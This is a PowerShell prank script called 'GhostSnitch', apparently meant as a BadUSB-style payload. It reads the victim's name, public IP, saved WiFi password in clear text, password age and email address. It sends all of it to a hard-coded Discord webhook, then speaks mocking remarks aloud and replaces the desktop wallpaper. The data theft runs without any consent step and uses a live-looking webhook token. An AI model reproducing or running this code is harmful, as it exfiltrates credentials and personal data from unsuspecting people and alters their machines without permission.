
####################################################################################################
# Title       : GhostSnitch
# Version     : 1.0
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame.
####################################################################################################

# Set up SAPI for text-to-speech
$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -1

# Function to get user's full name
function Get-FullName {
    try {
        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
    } catch {
        $fullName = $env:username
    }
    return $fullName
}
$fullName = Get-FullName

# Function to get RAM and generate roast
function Get-RAM {
    try {
        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
        $RAM = [int]$RAM
        if ($RAM -lt 4) {
            return "$RAM GB of RAM? This machine is powered by hopes and prayers."
        } elseif ($RAM -lt 8) {
            return "$RAM GB of RAM? Just enough to load your regrets."
        } elseif ($RAM -lt 16) {
            return "$RAM GB? Gamer vibes... if lag was a feature."
        } else {
            return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
        }
    } catch {
        return "Unable to detect RAM. Maybe the hamster escaped the wheel?"
    }
}

# Function to get public IP
function Get-PubIP {
    try {
        $IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
        return "Your public IP is $IP. Say hi to the world for me."
    } catch {
        return "Couldn't fetch your public IP. You're a ghost already."
    }
}

# Function to get current WiFi SSID and password
function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        $length = $pass.Length
        if ($length -lt 8) {
            return "$ssid is your network? That password: $pass ... it's crying for help."
        } elseif ($length -lt 12) {
            return "$ssid's password is $pass — trying, but still failing."
        } else {
            return "$ssid's password is $pass. Secure? Maybe. Still roasted? Definitely."
        }
    } catch {
        return "No WiFi password found. You out here freeloading?"
    }
}

# Function to get last password set date
function Get-PasswordAge {
    try {
        $line = (net user $env:UserName | Select-String "Password last set").ToString()
        $dateStr = $line.Substring($line.IndexOf(":")+1).Trim()
        $days = (New-TimeSpan -Start $dateStr -End (Get-Date)).Days
        if ($days -lt 30) {
            return "Changed your password $days days ago. Fresh... but not fresh enough."
        } elseif ($days -lt 180) {
            return "$days days since your last password change. You're cruising for a snoozing."
        } else {
            return "$days days? That password's got mold on it."
        }
    } catch {
        return "Password age unknown. Are you even human?"
    }
}

# Function to get user email (if present)
function Get-Email {
    try {
        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
        if ($email -like "*gmail*") {
            return "Gmail user? Stylish. But your inbox is probably chaos."
        } elseif ($email -like "*yahoo*") {
            return "Yahoo... in 2025? A digital fossil."
        } elseif ($email -like "*hotmail*") {
            return "Hotmail? Do you also use Netscape?"
        } else {
            return "$email is your email? Obscure. I like it."
        }
    } catch {
        return "No email found. A mystery wrapped in encryption."
    }
}

# Send to discord webhook
$webhookUrl = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'

# Prepare the message content
$discordPayload = @{
    username = "👻 GhostSnitch Bot"
    content = "**🎯 Roast Session Logged!**"
    embeds = @(@{
        title = "🧠 Roast Report for $fullName"
        color = 16711680
        fields = @(
            @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
            @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
            @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false },
            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false }
        )
        footer = @{ text = "GhostSnitch v1.0 by TBJr" }
        timestamp = (Get-Date).ToString("o")
    })
}

# Convert to JSON and POST
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $discordPayload -Depth 10) -ContentType 'application/json'
# Function to generate roast wallpaper
function Make-Wallpaper {
    Add-Type -AssemblyName System.Drawing
    $screen = Add-Type -MemberDefinition @"
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
"@ -Name "Win32" -Namespace "Screen" -PassThru
    $hdc = [Screen.Win32]::GetDC([IntPtr]::Zero)
    $width = [Screen.Win32]::GetDeviceCaps($hdc, 118)
    $height = [Screen.Win32]::GetDeviceCaps($hdc, 117)
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $font = New-Object System.Drawing.Font "Consolas", 24
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.Clear([System.Drawing.Color]::Black)
    $brush = [System.Drawing.Brushes]::Lime
    $msg = "Your system was evaluated.
You're not ready for the future.
- GhostSnitch"
    $graphics.DrawString($msg, $font, $brush, 100, 100)
    $path = "$env:USERPROFILE\Desktop\roasted.jpg"
    $bitmap.Save($path)
    $graphics.Dispose()
    Add-Type -TypeDefinition @"
        using System.Runtime.InteropServices;
        public class Wallpaper {
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $path, 3)
    return $path
}

# Pause until mouse is moved
Add-Type -AssemblyName System.Windows.Forms
$startPos = [System.Windows.Forms.Cursor]::Position
while ($true) {
    Start-Sleep -Seconds 2
    if ([System.Windows.Forms.Cursor]::Position.X -ne $startPos.X -or [System.Windows.Forms.Cursor]::Position.Y -ne $startPos.Y) {
        break
    }
}

# Begin roast
$s.Speak("Hello, $fullName. Let's review your setup.")
$s.Speak((Get-RAM))
$s.Speak((Get-PubIP))
$s.Speak((Get-WifiPass))
$s.Speak((Get-PasswordAge))
$s.Speak((Get-Email))
$s.Speak("Check your wallpaper. And don't act surprised.")
Make-Wallpaper | Out-Null
$s.Speak("That concludes your roast. GhostSnitch out.")
